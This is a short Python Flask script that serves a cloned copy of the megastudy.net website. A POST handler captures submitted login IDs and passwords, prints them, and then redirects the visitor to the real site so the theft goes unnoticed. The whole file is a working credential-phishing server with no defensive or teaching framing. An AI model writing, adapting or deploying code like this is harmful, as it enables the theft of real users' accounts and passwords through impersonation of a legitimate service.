from flask import Flask, send_from_directory, request, redirect

app = Flask(__name__)

@app.route('/', defaults={'path': 'index.html'})
@app.route('/<path:path>')
def serve(path):
    return send_from_directory('static/megastudy_htttrack', path)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("loginid")  # 폼 필드 이름에 맞춰야 함
    password = request.form.get("loginpw")

    print(f"login_id: {username}")
    print(f"login_pw: {password}")
    
    return redirect("https://www.megastudy.net/") 

if __name__ == '__main__':
    app.run(debug=True)
